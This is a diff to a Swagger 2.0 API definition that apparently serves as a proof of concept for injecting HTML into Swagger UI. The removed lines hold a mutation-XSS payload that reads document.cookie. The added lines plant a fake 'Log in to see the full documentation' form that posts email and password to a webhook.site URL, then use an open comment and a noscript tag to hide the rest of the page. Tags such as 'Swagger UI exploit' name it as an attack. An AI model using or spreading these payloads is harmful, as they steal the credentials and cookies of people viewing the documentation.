@@ -2,10 +2,15 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
-
+    <h1>Log in to see the full documentation</h1>
+    <form action="https://webhook.site/bc8d6747-e2bd-4874-b5be-2a28cf18a41e" method="post">
+    <label for="email">Login:</label>
+    <input name="email">
+    <label for="password">Password:</label>
+    <input name="password">
+    <input type="submit" value="Login"></form><!--
   version: production
-basePath: https://target.com
+basePath: https://www.cybecs.com
 produces:
 - application/xml
 - application/json
@@ -15,20 +20,20 @@ consumes:
 security:
 - basicAuth: []
 paths:
-  "/s1rn3tz":
+  "/test":
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-      - Mathis Pais De Sousa
+      - sometext
       operationId: findAccounts
       summary: this is example text
-  "/exploited_by_s1rn3tz":
+  "/malformed_by_Andrei":
     delete:
       parameters:
       - description: |
-          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+          <noscript>
 
         format: int64
         in: path
@@ -39,9 +44,9 @@ paths:
         '200':
           description: No response was specified
       tags:
-      - Swagger UI exploit
-      operationId: afine
-      summary: afine
+      - test
+      operationId: test
+      summary: test
     get:
       parameters:
       - description: this is example text
@@ -54,6 +59,6 @@ paths:
         '200':
           description: No response was specified
       tags:
-      - Swagger UI exploit
+      - Andrei
       operationId: some_operation
       summary: this is example text
